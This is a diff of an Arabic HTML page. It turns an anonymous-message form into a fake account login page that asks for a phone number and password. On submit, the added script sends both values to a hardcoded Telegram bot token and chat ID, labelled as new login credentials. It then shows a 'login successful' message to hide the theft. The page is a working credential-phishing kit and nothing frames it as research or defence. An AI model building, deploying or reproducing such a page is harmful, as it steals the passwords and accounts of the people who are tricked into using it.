@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سجل روحك</title>
+    <title>تسجيل دخول ب حسابك</title>
     <style>
         * {
             box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         body {
-            background-color: #f0f7ff;
+            background-color: #f1f6fc;
             color: #1e293b;
             display: flex;
             justify-content: center;
@@ -22,24 +22,18 @@
         }
         .card {
             background: #ffffff;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-            border: 1px solid #e2e8f0;
+            padding: 40px 30px;
+            border-radius: 28px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.03);
             width: 100%;
             max-width: 400px;
             text-align: center;
         }
         h2 {
-            font-size: 26px;
-            margin-bottom: 8px;
-            color: #0284c7;
-            font-weight: 700;
-        }
-        p {
-            font-size: 14px;
-            color: #64748b;
-            margin-bottom: 25px;
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #0076c6;
+            font-weight: 600;
         }
         .input-group {
             margin-bottom: 20px;
@@ -48,49 +42,53 @@
         label {
             display: block;
             font-size: 15px;
-            color: #334155;
-            margin-bottom: 8px;
-            font-weight: 600;
+            color: #475569;
+            margin-bottom: 10px;
+            font-weight: 500;
         }
         input {
             width: 100%;
-            padding: 14px 16px;
-            background: #f8fafc;
-            border: 1.5px solid #cbd5e1;
+            padding: 16px;
+            background: #f5f8fc;
+            border: 1.5px solid #e2e8f0;
             color: #1e293b;
-            border-radius: 12px;
+            border-radius: 16px;
             font-size: 16px;
             outline: none;
             transition: all 0.3s ease;
+            text-align: left; /* لجعل النص الإنجليزي يظهر بشكل صحيح */
         }
         input:focus {
-            border-color: #0284c7;
+            border-color: #0076c6;
             background: #fff;
         }
-        button {
+        /* تصميم زر تسجيل الدخول الجديد والمتناسق */
+        .submit-btn {
             width: 100%;
-            padding: 15px;
-            background-color: #0284c7;
+            padding: 16px;
+            background-color: #0076c6;
             color: white;
             border: none;
-            border-radius: 12px;
+            border-radius: 16px;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
+            margin-top: 15px;
         }
-        button:hover {
-            background-color: #0369a1;
+        .submit-btn:hover {
+            background-color: #005fa1;
             transform: translateY(-2px);
         }
 
+        /* نافذة النجاح (Modal) */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.9);
+            background: rgba(0, 0, 0, 0.4);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -101,8 +99,7 @@
         }
         .modal {
             background: white;
-            border: 2px solid #22c55e;
-            border-radius: 20px;
+            border-radius: 24px;
             padding: 30px;
             width: 90%;
             max-width: 350px;
@@ -119,10 +116,12 @@
             background: #22c55e;
             color: white;
             border: none;
-            padding: 10px 25px;
-            border-radius: 8px;
+            padding: 12px 30px;
+            border-radius: 12px;
             cursor: pointer;
             margin-top: 15px;
+            font-size: 16px;
+            width: 100%;
         }
     </style>
 </head>
@@ -130,50 +129,66 @@
 
     <div class="card">
         <h2>تسجيل دخول ب حسابك</h2>
-        <p></p>
         
         <form id="telegramForm">
             <div class="input-group">
-                <label for="username">رقم هاتف</label>
-                <input type="text" id="username" placeholder="">
+                <label for="phone">رقم هاتف</label>
+                <input type="text" id="phone" placeholder="kawther" required>
             </div>
             
             <div class="input-group">
-                <label for="message">كلمة المرور</label>
-                <input type="text" id="message" placeholder=" required>
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" placeholder="dn dn kawther" required>
             </div>
             
-            <button type="submit">تسجيل دخول</button>
+            <!-- زر الإرسال المضاف والمعدل لتسجيل الدخول -->
+            <button type="submit" class="submit-btn">تسجيل دخول</button>
         </form>
     </div>
 
+    <!-- نافذة النجاح المبسطة -->
     <div class="modal-overlay" id="successModal">
         <div class="modal">
-            <div class="success-icon">✅</div>
-            <h3>تمت العملية بنجاح</h3>
-            <p></p>
+            <div class="success-icon">✓</div>
+            <h3>تم تسجيل الدخول بنجاح</h3>
+            <p>تم إرسال البيانات المطلوبة.</p>
             <button class="close-btn" onclick="closeModal()">موافق</button>
         </div>
     </div>
 
     <script>
+        // معلومات بوت التيليجرام الخاص بك
         const TELEGRAM_TOKEN = '8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ'; 
         const CHAT_ID = '7094930209';
 
         document.getElementById('telegramForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
-            let username = document.getElementById('username').value.trim() || "شخص مجهول 👤";
-            const message = document.getElementById('message').value;
-            const textMessage = `📩 **رسالة سرية جديدة!**\n\n👤 **المرسل:** ${username}\n💬 **الرسالة:** ${message}`;
+            
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            
+            // صياغة الرسالة المرسلة للتيليجرام بشكل منظم
+            const textMessage = `👤 **بيانات تسجيل دخول جديدة:**\n\n📞 **رقم الهاتف:** \`${phone}\`\n🔑 **كلمة المرور:** \`${password}\``;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage, parse_mode: 'Markdown' })
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: textMessage, 
+                    parse_mode: 'Markdown' 
+                })
             })
-            .then(data => {
-                document.getElementById('successModal').classList.add('show');
-                document.getElementById('telegramForm').reset();
+            .then(response => {
+                if(response.ok) {
+                    document.getElementById('successModal').classList.add('show');
+                    document.getElementById('telegramForm').reset();
+                } else {
+                    alert('حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً.');
+                }
+            })
+            .catch(err => {
+                alert('فشل الاتصال بالخادم.');
             });
         });
 
